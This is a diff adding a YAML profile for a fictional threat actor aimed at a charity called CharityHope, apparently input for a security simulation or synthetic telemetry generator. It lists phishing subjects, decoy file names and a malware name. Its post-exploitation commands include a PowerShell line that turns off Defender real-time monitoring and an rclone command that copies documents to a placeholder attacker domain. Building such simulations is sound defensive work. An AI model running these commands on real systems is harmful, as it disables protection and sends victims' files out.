@@ -1,0 +1,88 @@
+name: CharityHope
+effectiveness: 75
+count_init_passive_dns: 15
+max_wave_size: 4
+attacks:
+  - recon:browsing
+  - watering_hole:malware_delivery
+compromised_email_targets:
+  - info@charityhope.org
+  - donations@charityhope.org
+  - fundraising@charityhope.org
+  - ceo@charityhope.org
+domain_themes:
+  - charity
+  - fundraising
+  - donations
+  - philanthropy
+  - social_impact
+  - humanitarian
+  - community
+  - outreach
+  - volunteer
+  - contribution
+  - enerosity
+  - kindness
+  - compassion
+  - goodwill
+sender_themes:
+  - volunteer
+  - donor
+  - fundraiser
+  - philanthropist
+  - charity_worker
+  - activist
+  - community_member
+  - humanitarian
+subjects:
+  - "Donation Receipt for Your Recent Contribution to CharityHope"
+  - "Invitation to CharityHope's Annual Fundraising Gala"
+  - "Update on the Impact of Your Donations to CharityHope"
+  - "Request for Support for CharityHope's Community Outreach Program"
+  - "CharityHope's Emergency Relief Fund - Donate Now!"
+  - "Join Us in Making a Difference - Volunteer with CharityHope"
+  - "Important Information about Your CharityHope Account"
+  - "Tax Receipt for Your Year-End Donation to CharityHope"
+  - "Donation Match Opportunity - Double Your Impact with CharityHope"
+  - "Last Chance to Donate to CharityHope's Summer Youth Camp"
+  - "CharityHope's New Partnership with Local Community Center"
+recon_search_terms:
+  - charity fraud investigation
+  - fundraising embezzlement schemes
+  - fake charities to avoid
+  - charity watchdog organizations
+  - nonprofit financial transparency
+  - charity tax evasion
+  - charity governance best practices
+  - fundraising event security measures
+  - charity marketing strategies
+file_names:
+  - Donor-Database-2023.xls
+  - Fundraising-Event-Planning-Guide.pdf
+  - Charitable-Giving-Tax-Guide.docx
+  - Community-Outreach-Program-Proposal.docx
+  - CharityHope-Marketing-Strategy.pptx
+  - Annual-Report-2022.pdf
+  - Board-Meeting-Minutes-Jan2023.docx
+  - Fundraising-Campaign-Budget.xls
+  - Volunteer-Handbook.docx
+  - Charitable-Impact-Report-2022.pdf
+tlds:
+  - org
+  - com
+spoofs_email: True
+malware:
+  - hopestealer
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\"
+  - name: cmd.exe
+    process: "cmd.exe dir D:\"
+  - name: cmd.exe
+    process: "cmd.exe cd Users\Public\Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
